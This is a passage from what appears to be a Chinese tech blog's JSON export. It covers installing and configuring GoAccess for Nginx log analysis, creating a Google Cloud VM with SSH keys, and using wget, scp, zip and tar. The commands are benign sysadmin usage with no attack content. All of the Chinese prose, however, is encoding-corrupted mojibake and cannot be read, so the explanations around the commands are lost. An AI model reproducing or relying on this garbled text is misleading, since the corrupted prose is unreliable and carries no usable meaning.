æ—¶ï¼Œè¸©åˆ°äº†ä¸€äº›å‘ï¼Œå¯¼è‡´æˆ‘ä¸€åº¦è®¤ä¸ºè¿™ä¸ªå·¥å…·æ˜¯ä¸æ˜¯å­˜åœ¨ä»€ä¹ˆBugã€‚å› ä¸ºåœ¨çœ‹åˆ«äººçš„æ•™ç¨‹ä¸­éƒ½æ˜¯å¼€ç®±å³ç”¨ã€‚ ä¸‹é¢ä»å®‰è£…åˆ°ä½¿ç”¨ä¼šä¸€ä¸€è¯¦ç»†è¯´æ˜ã€‚ å®‰è£… GoAccesså› ä¸ºæœåŠ¡å™¨çš„æ“ä½œç³»ç»Ÿæ˜¯ Ubuntuï¼Œæ‰€ä»¥è¿™é‡Œä»¥ Ubuntuä¸ºä¾‹ï¼š å› ä¸ºå¹¶éæ‰€æœ‰å‘è¡Œç‰ˆéƒ½æä¾›æœ€æ–°ç‰ˆæœ¬çš„ GoAccessï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨å®˜æ–¹æä¾›çš„æœ€æ–°ç¨³å®šç‰ˆçš„å®‰è£…æ–¹å¼ 1234$ echo &quot;deb http:&#x2F;&#x2F;deb.goaccess.io&#x2F; $ï¼ˆlsb_release -csï¼‰main&quot; | sudo tee -a &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;goaccess.list$ wget -O - https:&#x2F;&#x2F;deb.goaccess.io&#x2F;gnugpg.key | sudo apt-key add - $ sudo apt-get update$ sudo apt-get install goaccess ç¡®å®šæ—¥å¿—æ ¼å¼åœ¨è®¡ç®—æœºå®‰è£…äº†GoAccess ä¹‹åï¼Œè¦åšçš„ç¬¬ä¸€ä»¶äº‹æƒ…å°±æ˜¯ç¡®å®šè®¿é—®æ—¥å¿—çš„æ—¥å¿—æ ¼å¼ï¼Œå¯ä»¥åœ¨æ°¸ä¹…è®¾ç½®å®ƒä»¬ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å‘½ä»¤è¡Œä¼ é€’ä»–ä»¬ã€‚ è¿™é‡Œç”¨Nginx çš„ access.log ä¸ºä¾‹ 136.113.128.155 - - [28&#x2F;Apr&#x2F;2019:02:20:01 +0000] &quot;GET &#x2F;Manage&#x2F;Dingdan&#x2F;fail_index&#x2F;startTime&#x2F;2019-04-28+00%3A00%3A00&#x2F;endTime&#x2F;2019-04-28+23%3A59%3A59.html HTTP&#x2F;1.1&quot; 200 7798 &quot;http:&#x2F;&#x2F;www.692213.com&#x2F;Manage&#x2F;Dingdan&#x2F;fail_index&#x2F;startTime&#x2F;2019-04-28+00%3A00%3A00&#x2F;endTime&#x2F;2019-04-28+23%3A59%3A59.html&quot; &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;70.0.3538.110 Safari&#x2F;537.36&quot; æ–¹å¼ä¸€ï¼Œé…ç½®.goaccessrcæ–‡ä»¶ï¼š 12345vim ~&#x2F;.goaccessrctime-format %Tdate-format %d&#x2F;%b&#x2F;%Ylog_format %h %^[%d:%t %^] &quot;%r&quot; %s %b &quot;%R&quot; &quot;%u&quot; %^ æ–¹å¼äºŒï¼Œåœ¨å‘½ä»¤è¡Œä¼ é€’å‚æ•°ï¼š 1$ goaccess nginx&#x2F;access.log --log-format&#x3D;&#39;%h %^[%d:%t %^] &quot;%r&quot; %s %b &quot;%R&quot; &quot;%u&quot; %^&#39; --date-format&#x3D;%d&#x2F;%b&#x2F;%Y --time-format&#x3D;%T æ³¨æ„ï¼šæ— è®ºæ˜¯é…ç½®æ–‡ä»¶è¿˜æ˜¯å‘½ä»¤è¡Œå‚æ•° éƒ½ä¸æ˜¯æ°¸è¿œä¸å˜çš„ï¼Œåªæ˜¯ç›¸å¯¹äºä½ è¦ç›‘æ§çš„æ—¥å¿—æ ¼å¼ã€‚ è¿è¡ŒGoAccessæ–¹å¼ä¸€ï¼Œé€šè¿‡-på‚æ•°ï¼ŒæŒ‡å®šé…ç½®æ–‡ä»¶ã€‚ 1$ goaccess nginx&#x2F;access.log -p ~&#x2F;.goaccessrc æ–¹å¼äºŒï¼Œç›´æ¥åœ¨å‘½ä»¤è¡Œå‚æ•°ä¸­æŒ‡å®šæ—¥å¿—æ ¼å¼ï¼Œè¯¦æƒ…è§ä¸Šé¢çš„ä¾‹å­ã€‚ ç»ˆç«¯è¾“å‡ºä»¥ä¸‹æç¤ºä½¿ç”¨é¢„å®šä¹‰æ—¥å¿—æ ¼å¼çš„æ—¥å¿—é…ç½®å¯¹è¯æ¡†ä¾›æ‚¨é€‰æ‹©ï¼Œç„¶åå®æ—¶æ˜¾ç¤ºç»Ÿè®¡ä¿¡æ¯ã€‚ 1$ goaccess nginx&#x2F;access.log -c é€šå¸¸é€‰æ‹©ç¬¬ä¸‰ä¸ªï¼Œé€šç”¨æ—¥å¿—æ ¼å¼ï¼ˆCLFï¼‰ï¼ŒæˆåŠŸä¹‹åå°±æ˜¯è¿™æ ·ä¸ªæ ·å­ï¼š æ§åˆ¶å°ä¸‹çš„æ“ä½œæ–¹æ³•ï¼š 1234567891011121314151617* F1æˆ–hä¸»è¦å¸®åŠ©ã€‚* F5é‡ç»˜ä¸»çª—å£ã€‚* qé€€å‡ºç¨‹åºï¼Œå½“å‰çª—å£æˆ–æŠ˜å æ´»åŠ¨æ¨¡å—* oæˆ–ENTERå±•å¼€æ‰€é€‰æ¨¡å—æˆ–æ‰“å¼€çª—å£* 0-9å¹¶å°†Shift + 0æ‰€é€‰æ¨¡å—è®¾ç½®ä¸ºæ´»åŠ¨çŠ¶æ€* jåœ¨å±•å¼€çš„æ¨¡å—ä¸­å‘ä¸‹æ»šåŠ¨* kåœ¨æ‰©å±•æ¨¡å—ä¸­å‘ä¸Šæ»šåŠ¨* cè®¾ç½®æˆ–æ›´æ”¹æ–¹æ¡ˆé¢œè‰²* ^ fåœ¨æ´»åŠ¨æ¨¡å—ä¸­å‘å‰æ»šåŠ¨ä¸€ä¸ªå±å¹•* ^ båœ¨æ´»åŠ¨æ¨¡å—ä¸­å‘åæ»šåŠ¨ä¸€ä¸ªå±å¹•* TABè¿­ä»£æ¨¡å—ï¼ˆè½¬å‘ï¼‰* SHIFT + TABè¿­ä»£æ¨¡å—ï¼ˆå‘åï¼‰* så¯¹æ´»åŠ¨æ¨¡å—çš„æ’åºé€‰é¡¹* &#x2F;æœç´¢æ‰€æœ‰æ¨¡å—ï¼ˆå…è®¸æ­£åˆ™è¡¨è¾¾å¼ï¼‰* næ‰¾åˆ°ä¸‹ä¸€ä¸ªå‡ºç°çš„ä½ç½®* gç§»è‡³å±å¹•çš„ç¬¬ä¸€ä¸ªé¡¹ç›®æˆ–é¡¶éƒ¨* Gç§»åŠ¨åˆ°å±å¹•çš„æœ€åä¸€é¡¹æˆ–åº•éƒ¨ é™æ€HTML è¾“å‡ºä»¥ä¸‹å†…å®¹åˆ†æè®¿é—®æ—¥å¿—å¹¶åœ¨é™æ€HTMLæŠ¥å‘Šä¸­æ˜¾ç¤ºç»Ÿè®¡ä¿¡æ¯ã€‚ 1$ goaccess -a -d -f nginx&#x2F;access.log.1 -p ~&#x2F;.goaccessrc -o &#x2F;var&#x2F;www&#x2F;report.html å®æ—¶HTML è¾“å‡º1$ goaccess -a -d -f nginx&#x2F;access.log.1 -p ~&#x2F;.goaccessrc -o &#x2F;var&#x2F;www&#x2F;report.html --real-time-html ç„¶åç”¨æµè§ˆå™¨è®¿é—®ï¼Œå¤§æ¦‚å°±æ˜¯è¿™ä¸ªæ ·å­ï¼š é…ç½®æ–‡ä»¶åŠæ—¥å¿—æ ¼å¼è¯´æ˜GoAccess çš„é…ç½®æ–‡ä»¶ä½äº%sysconfdir%/goaccess.confæˆ–~/.goaccessrc å…¶ä¸­ï¼Œ%sysconfdir%æ˜¯ /etc/ï¼Œ/usr/etc/ æˆ– /usr/local/etc/ time-formatå’Œdate-formatçš„æ ¼å¼é€šå¸¸éƒ½æ˜¯å›ºå®šçš„ï¼Œåªæœ‰log-formatçš„æ ¼å¼è§†å…·ä½“æ—¥å¿—æ ¼å¼è€Œå®šã€‚ 123time-format %Tdate-format %d&#x2F;%b&#x2F;%Y log-formatå¸¸ç”¨æ ¼å¼è¯´æ˜ï¼š 1234567891011121314151617181920212223* %xä¸æ—¶é—´æ ¼å¼å’Œæ—¥æœŸæ ¼å¼å˜é‡åŒ¹é…çš„æ—¥æœŸå’Œæ—¶é—´å­—æ®µã€‚å½“ç»™å‡ºæ—¶é—´æˆ³è€Œä¸æ˜¯æ—¥æœŸå’Œæ—¶é—´åœ¨ä¸¤ä¸ªå•ç‹¬çš„å˜é‡ä¸­æ—¶ä½¿ç”¨ã€‚* %tæ—¶é—´å­—æ®µåŒ¹é…æ—¶é—´æ ¼å¼å˜é‡ã€‚* %dä¸æ—¥æœŸæ ¼å¼å˜é‡åŒ¹é…çš„æ—¥æœŸå­—æ®µã€‚* %væœåŠ¡å™¨åç§°æ ¹æ®è§„èŒƒåç§°è®¾ç½®ï¼ˆæœåŠ¡å™¨å—æˆ–è™šæ‹Ÿä¸»æœºï¼‰ã€‚* %eè¿™æ˜¯HTTPèº«ä»½éªŒè¯ç¡®å®šçš„è¯·æ±‚æ–‡æ¡£çš„äººçš„ç”¨æˆ·æ ‡è¯†ã€‚* %hhostï¼ˆå®¢æˆ·ç«¯IPåœ°å€ï¼ŒIPv4æˆ–IPv6ï¼‰* %ræ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚è¡Œã€‚è¿™éœ€è¦å›´ç»•è¯·æ±‚çš„ç‰¹å®šåˆ†éš”ç¬¦ï¼ˆå•å¼•å·ï¼ŒåŒå¼•å·ç­‰ï¼‰å¯è§£æã€‚å¦åˆ™ï¼Œä½¿ç”¨ç‰¹æ®Šçš„æ ¼å¼è¯´æ˜ç¬¦ï¼Œå¦‚ç»„åˆ%mï¼Œ%Uï¼Œ%qå’Œ%Hè§£æå„ä¸ªå­—æ®µã€‚æ³¨æ„ï¼šä½¿ç”¨æˆ–è€…%rè·å¾—å®Œæ•´çš„è¯·æ±‚OR %mï¼Œ%Uï¼Œ%qå¹¶%Hå½¢æˆä½ çš„è¦æ±‚ï¼Œä¸è¦åŒæ—¶ä½¿ç”¨ã€‚* %mè¯·æ±‚æ–¹æ³•ã€‚* %Uè¯·æ±‚çš„URLè·¯å¾„ã€‚æ³¨æ„ï¼šå¦‚æœæŸ¥è¯¢å­—ç¬¦ä¸²åœ¨%Uï¼Œåˆ™æ— éœ€ä½¿ç”¨%qã€‚ä½†æ˜¯ï¼Œå¦‚æœURLè·¯å¾„ä¸åŒ…å«ä»»ä½•æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œåˆ™å¯ä»¥ä½¿ç”¨%qå¹¶å°†æŸ¥è¯¢å­—ç¬¦ä¸²é™„åŠ åˆ°è¯·æ±‚ä¸­ã€‚* %qæŸ¥è¯¢å­—ç¬¦ä¸²ã€‚* %Hè¯·æ±‚åè®®ã€‚* %sæœåŠ¡å™¨å‘é€å›å®¢æˆ·ç«¯çš„çŠ¶æ€ä»£ç ã€‚* %bè¿”å›ç»™å®¢æˆ·ç«¯çš„å¯¹è±¡å¤§å°ã€‚* %Râ€œRefererâ€HTTPè¯·æ±‚æ ‡å¤´ã€‚* %uç”¨æˆ·ä»£ç†HTTPè¯·æ±‚æ ‡å¤´ã€‚* %DæœåŠ¡è¯·æ±‚æ‰€éœ€çš„æ—¶é—´ï¼Œä»¥å¾®ç§’ä¸ºå•ä½ã€‚* %TæœåŠ¡è¯·æ±‚æ‰€éœ€çš„æ—¶é—´ï¼Œä»¥æ¯«ç§’ä¸ºå•ä½ï¼Œåˆ†è¾¨ç‡ä¸ºæ¯«ç§’ã€‚* %L æœåŠ¡è¯·æ±‚æ‰€ç”¨çš„æ—¶é—´ï¼Œä»¥æ¯«ç§’ä¸ºå•ä½çš„åè¿›åˆ¶æ•°ã€‚* %^å¿½ç•¥æ­¤å­—æ®µã€‚* %~å‘å‰ç§»åŠ¨æ—¥å¿—å­—ç¬¦ä¸²ï¼Œç›´åˆ°æ‰¾åˆ°éç©ºæ ¼ï¼ˆï¼isspaceï¼‰charã€‚* ~h X-Forwarded-Forï¼ˆXFFï¼‰å­—æ®µä¸­çš„ä¸»æœºï¼ˆå®¢æˆ·ç«¯IPåœ°å€ï¼ŒIPv4æˆ–IPv6ï¼‰ã€‚ å¸¸ç”¨å‚æ•° -fï¼šæŒ‡å®šéœ€è¦åˆ†æçš„æ—¥å¿—æ–‡ä»¶è·¯å¾„ -cï¼šç¨‹åºå¯åŠ¨æ—¶æç¤ºæ—¥å¿—/æ—¥æœŸé…ç½®çª—å£ -pï¼šæŒ‡å®šè¦ä½¿ç”¨çš„è‡ªå®šä¹‰é…ç½®æ–‡ä»¶ -dï¼šåœ¨HTMLæˆ–JSONè¾“å‡ºä¸Šå¯ç”¨IPè§£æå™¨ -oï¼šè¾“å‡ºåˆ°æŒ‡å®šæ‰©å±•åæ–‡ä»¶ä¸­ï¼ˆHtmlã€Jsonã€CSVï¼‰ -aï¼šæŒ‰ä¸»æœºå¯ç”¨ç”¨æˆ·ä»£ç†åˆ—è¡¨ã€‚ä¸ºäº†æ›´å¿«åœ°è§£æï¼Œè¯·ä¸è¦å¯ç”¨æ­¤æ ‡å¿— -dï¼šåœ¨HTMLæˆ–JSONè¾“å‡ºä¸Šå¯ç”¨IPè§£æå™¨ã€‚ æ€»ç»“ï¼šGoAccess ä»å®‰è£…åˆ°ä½¿ç”¨è¿˜æ˜¯éå¸¸æ–¹ä¾¿çš„ï¼Œä¸ä»…å¯ä»¥å¯¹å†å²çš„æ—¥å¿—è¿›è¡Œåˆ†æï¼Œä¹Ÿèƒ½å®æ—¶å¯¹æ—¥å¿—è¿›è¡Œåˆ†æï¼Œæ‰€æ”¯æŒçš„æ—¥å¿—æ ¼å¼åŸºæœ¬èƒ½æ»¡è¶³å¤§å¤šæ•°åº”ç”¨åœºæ™¯ã€‚ å‚è€ƒé“¾æ¥ GoAccess å®˜ç½‘ GoAccess å…¥é—¨ ä½¿ç”¨GoAccess åˆ†æNginx æ—¥å¿— å°†Nginx log_formatè½¬æ¢ä¸ºgoaccessé…ç½®æ–‡ä»¶ GoAccess æ—¥å¿—æ ¼å¼è½¬æ¢æ¡ˆä¾‹ä¸€ GoAccess æ—¥å¿—æ ¼å¼è½¬æ¢æ¡ˆä¾‹äºŒ GoAccess æ—¥å¿—æ ¼å¼è½¬æ¢æ¡ˆä¾‹ä¸‰ GoAccess æ—¥å¿—æ ¼å¼è½¬æ¢æ¡ˆä¾‹å››","categories":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/categories/Nginx/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"},{"name":"GoAccess","slug":"GoAccess","permalink":"https://www.0x2beace.com/tags/GoAccess/"},{"name":"Logs","slug":"Logs","permalink":"https://www.0x2beace.com/tags/Logs/"}]},{"title":"æ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•åˆ›å»ºå¯åŠ¨ Google Cloud å®ä¾‹","slug":"teach-you-how-to-create-and-start-a-google-cloud-instance","date":"2020-08-26T15:25:21.000Z","updated":"2020-08-27T06:27:35.489Z","comments":true,"path":"teach-you-how-to-create-and-start-a-google-cloud-instance/","link":"","permalink":"https://www.0x2beace.com/teach-you-how-to-create-and-start-a-google-cloud-instance/","excerpt":"æœ€è¿‘éœ€è¦åœ¨Google Cloud ä¸Šé‡æ–°å¼€ä¸€å°HkåŒºçš„æœåŠ¡å™¨ï¼Œæ‰€ä»¥å†™è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•æ“ä½œè¿‡ç¨‹ã€‚","text":"æœ€è¿‘éœ€è¦åœ¨Google Cloud ä¸Šé‡æ–°å¼€ä¸€å°HkåŒºçš„æœåŠ¡å™¨ï¼Œæ‰€ä»¥å†™è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•æ“ä½œè¿‡ç¨‹ã€‚ åˆ›å»ºVM å®ä¾‹ Google Cloud å®˜ç½‘ Google Cloud Platform æ§åˆ¶å° è¿›å…¥æ§åˆ¶å°ï¼Œæ‰¾åˆ° Compute Engineï¼Œç‚¹å‡»åˆ›å»ºå®ä¾‹ã€‚ æ–°å»ºè™šæ‹Ÿæœºå®ä¾‹ï¼Œé€‰æ‹©ç›¸åº”çš„é…ç½®ã€‚ é€‰æ‹©æ“ä½œç³»ç»Ÿæ˜ åƒï¼Œä»¥åŠç£ç›˜å¤§å°ã€‚ åŸºæœ¬é…ç½®å¦‚ä¸‹ï¼š ç„¶åç‚¹å‡»åˆ›å»ºå°±å¯ä»¥äº†ã€‚åˆ›å»ºæˆåŠŸä¹‹åï¼Œå°±å¯ä»¥çœ‹åˆ°è¯¥æœåŠ¡å™¨çš„IPåœ°å€äº†ã€‚ è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒGoogle Cloud çš„è¿œç¨‹è¿æ¥SSH çš„æ–¹å¼ä¸å…¶ä»–å¹³å°æœ‰æ‰€åŒºåˆ«ã€‚ åˆ›å»ºSSH è¿æ¥Compute Engine =ã€‹å…ƒæ•°æ® =ã€‹SSH å¯†é’¥ æ‰¾åˆ°ä¿®æ”¹ï¼Œç„¶åä¸Šä¼ ä½ çš„ SSH Keyã€‚ ä¸çŸ¥é“SSH Key æ˜¯ä»€ä¹ˆï¼Ÿ 1234$ ssh-keygen -t rsa# æ‰“å¼€ç»ˆç«¯ï¼Œè¾“å…¥ä¸Šé¢é‚£ä¸ªå‘½ä»¤# ç„¶ååœ¨~&#x2F;.ssh ç›®å½•ä¸‹ä¼šç”Ÿæˆä¸€ä¸ª å…¬é’¥å’Œç§é’¥# å°† .pub ç»“å°¾çš„æ–‡ä»¶æ‰“å¼€ï¼Œå¤åˆ¶å…¶ä¸­çš„å€¼ï¼Œç²˜è´´åˆ°Google Cloud ä¸Šå°±å¯ä»¥äº†ã€‚ è¿æ¥ä½¿ç”¨ssh -i max@35.241.77.3 å‘½ä»¤è¿æ¥ï¼Œå…¶ä¸­ max æ˜¯ç”¨æˆ·åï¼Œåé¢æ˜¯å¯¹åº”æœåŠ¡å™¨ ipåœ°å€ã€‚ å‚è€ƒé“¾æ¥ å¼€å¯Linux è™šæ‹Ÿæœºä½¿ç”¨å¿«é€Ÿå…¥é—¨â€“å®˜ç½‘æ–‡æ¡£ GCPï¼ˆGoogle Cloud Platformï¼‰å…¥é—¨","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Tutorial","slug":"Linux/Tutorial","permalink":"https://www.0x2beace.com/categories/Linux/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"äº‘","slug":"äº‘","permalink":"https://www.0x2beace.com/tags/%E4%BA%91/"}]},{"title":"ä¸å¸¸ç”¨Linuxå‘½ä»¤","slug":"not-commonly-used-linux-commands","date":"2020-08-25T12:53:33.000Z","updated":"2020-08-25T12:54:50.257Z","comments":true,"path":"not-commonly-used-linux-commands/","link":"","permalink":"https://www.0x2beace.com/not-commonly-used-linux-commands/","excerpt":"è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯è®°å½•é‚£äº›ä¸å¤ªå¸¸ç”¨ä½†å´å¾ˆå®ç”¨çš„ Linux å‘½ä»¤ã€‚","text":"è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯è®°å½•é‚£äº›ä¸å¤ªå¸¸ç”¨ä½†å´å¾ˆå®ç”¨çš„ Linux å‘½ä»¤ã€‚ Wgetwget å‘½ä»¤ç”¨äºæ–‡ä»¶çš„ä¸‹è½½ï¼Œ ä¸‹è½½å•ä¸ªæ–‡ä»¶123# ä¸‹è½½Ubuntu 18.04 æ¡Œé¢ç‰ˆå’ŒæœåŠ¡ç«¯ç‰ˆ$ wget https:&#x2F;&#x2F;mirror.xtom.com.hk&#x2F;ubuntu-releases&#x2F;18.04.2&#x2F;ubuntu-18.04.2-live-server-amd64.iso$ wget https:&#x2F;&#x2F;mirror.xtom.com.hk&#x2F;ubuntu-releases&#x2F;18.04.2&#x2F;ubuntu-18.04.2-desktop-amd64.iso wgeté»˜è®¤ä¼šä»¥æœ€åä¸€ä¸ªç¬¦åˆâ€/â€çš„åé¢çš„å­—ç¬¦æ¥å‘½ä»¤ï¼Œå¯¹äºåŠ¨æ€é“¾æ¥çš„ä¸‹è½½é€šå¸¸æ–‡ä»¶åä¼šä¸æ­£ç¡®ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‚æ•°-Oæ¥æŒ‡å®šä¸€ä¸ªæ–‡ä»¶åï¼š ä¸‹è½½å•ä¸ªæ–‡ä»¶å¹¶é‡å‘½å1$ wget -O file.zip http:&#x2F;&#x2F;www.minjieren.com&#x2F;download.aspx?id&#x3D;1080 åå°ä¸‹è½½å½“éœ€è¦ä¸‹è½½æ¯”è¾ƒå¤§çš„æ–‡ä»¶æ—¶ï¼Œä½¿ç”¨å‚æ•°-bå¯ä»¥éšè—åœ¨åå°è¿›è¡Œä¸‹è½½ï¼š 1$ wget -b http:&#x2F;&#x2F;www.minjieren.com&#x2F;wordpress-3.1-zh_CN.zip å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å¯Ÿçœ‹ä¸‹è½½è¿›åº¦ï¼š 1$ tail -f wget-log CurlScpscp å‘½ä»¤ç”¨äºæ–‡ä»¶ä¼ è¾“ï¼Œåœ¨ä¸èƒ½ä½¿ç”¨ XShell è¿™ç±»å·¥å…·æ—¶ï¼Œscpèƒ½å¾ˆå¥½çš„è§£å†³æ–‡ä»¶ä¸Šä¼ çš„é—®é¢˜ã€‚ ä¸Šä¼ æ–‡ä»¶1$ scp -r &#x2F;c&#x2F;User&#x2F;Desktop&#x2F;dirname username@34.92.117.222:&#x2F;tmp&#x2F;dirname ä¸‹è½½æ–‡ä»¶1$scp -r Boo@34.92.117.222:&#x2F;tmp&#x2F;dirname &#x2F;c&#x2F;Users&#x2F;Boo&#x2F;Desktop&#x2F;dirname å¦‚æœå­˜åœ¨ç«¯å£å·ï¼š æ³¨æ„ï¼š-På‚æ•°æ˜¯å¤§å†™ã€‚ 1scp -P 58812 root@103.232.86.239:&#x2F;tmp&#x2F;runfast_0603.sql ~&#x2F;File&#x2F; å…¶ä¸­ -r å‚æ•°è¡¨ç¤ºç›®å½•ï¼Œusername è¡¨ç¤ºæœåŠ¡å™¨å¯¹åº”ç”¨æˆ·ï¼Œ@ åé¢æ¥æœåŠ¡å™¨åœ°å€ã€‚ æ³¨æ„ï¼šä¸è¦ç›´æ¥ä½¿ç”¨ root ç”¨æˆ·ï¼Œå› ä¸ºæ€»æ˜¯ä¼šæç¤ºä½ æƒé™ä¸è¶³ã€‚å¦å¤–ä½¿ç”¨é root ç”¨æˆ·æ—¶ï¼Œéœ€è¦æ³¨æ„æ–‡ä»¶å¤¹æƒé™çš„é—®é¢˜ã€‚ zipzip å‘½ä»¤ç”¨äºå¯¹æ–‡ä»¶è¿›è¡Œæ‰“åŒ…å¤„ç†ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„å‹ç¼©ã€‚æ–‡ä»¶ç»å‹ç¼©ä¹‹åä¼šç”Ÿæˆä¸€ä¸ªå…·æœ‰.zipæ‰©å±•åçš„å‹ç¼©æ–‡ä»¶ã€‚ å°†å½“å‰ç›®å½•çš„dirç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åŠæ–‡ä»¶å¤¹å‹ç¼©ä¸º example.zip 1$ zip -r -q example.zip dir å°†å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åŠæ–‡ä»¶å¤¹å‹ç¼©ä¸º example.zip 1$ zip -r -q * å°†æŒ‡å®šæ–‡ä»¶ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶åŠæ–‡ä»¶å¤¹å‹ç¼©ä¸º example.zip 1$ zip -r -q exmaple.zip &#x2F;tmp&#x2F;dir unzipunzip å‘½ä»¤ç”¨äºè§£å‹ç¼©ç”± zip å‘½ä»¤å‹ç¼©çš„â€œ.zipâ€å‹ç¼©åŒ…ã€‚ æŸ¥çœ‹å‹ç¼©æ–‡ä»¶ 1$ unzip -v dir.zip å°†å‹ç¼©æ–‡ä»¶åœ¨å½“å‰ç›®å½•ä¸‹è§£å‹ 1$ unzip example.zip å°†å‹ç¼©æ–‡ä»¶example.zipåœ¨æŒ‡å®šç›®å½•/tmpä¸‹è§£å‹ç¼©ï¼Œå¦‚æœå·²æœ‰ç›¸åŒçš„æ–‡ä»¶å­˜åœ¨ï¼Œè¦æ±‚ unzipå‘½ä»¤ä¸è¦†ç›–åŸå…ˆçš„æ–‡ä»¶ã€‚ 1$ unzip -n example.zip -d &#x2F;tmp å°†å‹ç¼©æ–‡ä»¶example.zipåœ¨å½“å‰ç›®dirä¸‹è§£å‹ï¼Œå¦‚æœå·²æœ‰ç›¸åŒçš„æ–‡ä»¶ï¼Œä¸è¯¢é—®ï¼Œç›´æ¥è¦†ç›–ã€‚ 1$ unzip -o example.zip -d -o å‚æ•°è¡¨ç¤ºä¸å¿…å…ˆè¯¢é—®ç”¨æˆ·ï¼Œunzipæ‰§è¡Œåè¦†ç›–åŸæœ‰çš„æ–‡ä»¶ï¼›-d å‚æ•°æŒ‡å®šæ–‡ä»¶è§£å‹ç¼©åæ‰€è¦å­˜å‚¨çš„ç›®å½•ï¼›-n å‚æ•°è§£å‹ç¼©æ—¶ä¸è¦è¦†ç›–åŸæœ‰çš„æ–‡ä»¶ï¼› tartar å‘½ä»¤å¯ä»¥ä¸ºlinux æ–‡ä»¶å’Œç›®å½•åˆ›å»ºæ¡£æ¡ˆã€‚ åˆ©ç”¨tarå‘½ä»¤ï¼Œå¯ä»¥æŠŠä¸€å¤§å †çš„æ–‡ä»¶å’Œç›®å½•å…¨éƒ¨æ‰“åŒ…æˆä¸€ä¸ªæ–‡ä»¶ã€‚ éœ€è¦æ˜ç¡®çš„ä¸¤ä¸ªæ¦‚å¿µæ˜¯ï¼šæ‰“åŒ…å’Œå‹ç¼©æ˜¯ä¸åŒçš„ä¸¤ä»¶äº‹ã€‚ æ‰“åŒ…ï¼šæ˜¯æŒ‡å°†ä¸€å¤§å †æ–‡ä»¶æˆ–ç›®å½•å˜æˆä¸€ä¸ªæ€»çš„æ–‡ä»¶ï¼› å‹ç¼©ï¼šåˆ™æ˜¯å°†ä¸€ä¸ªå¤§æ–‡ä»¶é€šè¿‡å‹ç¼©ç®—æ³•å˜æˆä¸€ä¸ªå°æ–‡ä»¶ã€‚ ä¸ºä»€ä¹ˆè¦åŒºåˆ†è¿™ä¸¤ä¸ªæ¦‚å¿µå‘¢ï¼Ÿè¿™æºäºLinuxä¸­å¾ˆå¤šå‹ç¼©ç¨‹åºåªèƒ½é’ˆå¯¹ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼Œè¿™æ ·å½“ä½ æƒ³è¦å‹ç¼©ä¸€å¤§å †æ–‡ä»¶æ—¶ï¼Œä½ å¾—å…ˆå°†è¿™ä¸€å¤§å †æ–‡ä»¶å…ˆæ‰“æˆä¸€ä¸ªåŒ…ï¼ˆtarå‘½ä»¤ï¼‰ï¼Œç„¶åå†ç”¨å‹ç¼©ç¨‹åºè¿›è¡Œå‹ç¼©ï¼ˆgzip bzip2å‘½ä»¤ï¼‰ã€‚ æ‰“åŒ…ä»…æ‰“åŒ…ï¼Œä¸å‹ç¼©ã€‚ 1$ tar -cvf test.tar 20200323.log test.tarè¿™ä¸ªæ–‡ä»¶åæ˜¯è‡ªå®šä¹‰çš„ï¼Œåªæ˜¯ä¹ æƒ¯ä¸Šæˆ‘ä»¬ä½¿ç”¨.tarä½œä¸ºåŒ…æ–‡ä»¶ã€‚ æ‰“åŒ…å¹¶å‹ç¼©æ‰“åŒ…ï¼Œä¸”å‹ç¼©ã€‚-zå‚æ•°è¡¨ç¤ºä»¥.tar.gzæˆ–è€….tgzåç¼€åä»£è¡¨gzipå‹ç¼©è¿‡çš„taråŒ…ã€‚ 1$ tar -zcvf test.tar.gz 20200323.log æ‰“åŒ…ï¼Œä¸”å‹ç¼©ã€‚-jå‚æ•°è¡¨ç¤ºä»¥.tar.bz2åç¼€åä½œä¸ºtaråŒ…åã€‚ 1$ tar -jcvf test.tar.bz2 20200323.log æŸ¥çœ‹åŒ…å†…å®¹1$ tar -ztvf test.tar.gz å› ä¸ºä½¿ç”¨gzipå‘½ä»¤å‹ç¼©çš„test.tar.gzï¼Œæ‰€ä»¥æŸ¥çœ‹å‹ç¼©åŒ…æ—¶éœ€è¦åŠ ä¸Š-zå‚æ•°ã€‚ å¦‚ä½•åªè§£å‹éƒ¨åˆ†æ–‡ä»¶ï¼Ÿ 1$ tar -ztvf test.tar.gz 20200323.log è¿™ç§æ–¹å¼ä»…é™äºå–ä¸€ä¸ªæ–‡ä»¶ã€‚ è§£å‹åœ¨è¯¥ç›®å½•ä¸‹ç›´æ¥è§£å‹ï¼š 1$ tar -zxvf test.tar.gz è§£å‹è‡³æŒ‡å®šæ–‡ä»¶å¤¹ï¼š 123$ tar -zxvf test.tar.gz -C log$ ls log20200323.log gzip.gzå‹ç¼©åŒ…ï¼ˆä¸å¸¦tarï¼‰ï¼Œéœ€è¦ä½¿ç”¨gzip å‘½ä»¤å»è§£å‹ã€‚ 